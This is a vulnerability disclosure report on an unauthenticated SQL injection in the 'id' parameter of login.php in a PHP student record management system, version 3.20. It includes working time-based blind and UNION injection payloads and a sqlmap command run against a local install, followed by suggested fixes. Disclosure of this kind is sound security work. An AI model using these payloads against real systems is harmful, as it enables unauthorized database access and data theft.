# Students Record Management Project in PHP V 3.20/login.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Students Record Management Project in PHP
## Vendor Homepage

- https://phpgurukul.com/student-record-system-php/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- Doracat

## Vulnerable File

- /login.php

## VERSION(S)

- V3.20

## Software Link

- https://github.com/Doramer/doramer.github.io/raw/refs/heads/main/Student-Record-Management-System-PHP.zip

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was discovered in the 'login' section. The reason for this issue in the 'Students Record Management Project in PHP' is that attackers inject malicious code from the parameter 'id' and use it directly in SQL queries without proper cleaning or validation. This allows attackers to forge input values, manipulate SQL queries, and insert and execute unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of the 'Students Record Management Project in PHP', I discovered a critical SQL injection vulnerability in the 'login' process. This vulnerability arises from insufficient user input validation of the 'id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can access databases, modify or delete data, and access sensitive information without authorization. Immediate remedial measures need to be taken to ensure system security and protect data integrity

# To exploit this vulnerability, no login or authorization is required

# Vulnerability details and POC

## Vulnerability lonameion:

- 'id' parameter

## Payload:

```makefile
Parameter: id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=ad' AND (SELECT 4658 FROM (SELECT(SLEEP(5)))IxsU) AND 'BCvu'='BCvu&password=123456&submit=login

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=ad' UNION ALL SELECT 55,CONCAT(0x716b627671,0x424643495050664e794c4b6f6b7177676458486c584945706e4e7a6c597879646766556477697775,0x71716a7a71)-- -&password=123456&submit=login
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```bash
python3 sqlmap.py -u "http://127.0.0.1/Student-Record-Management-System-PHP/login.php" --data="id=ad&password=123456&submit=login" -p id --batch --current-db
```

![image-20250520182236491](images\image-20250520182236491.png)

# Suggested repair

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.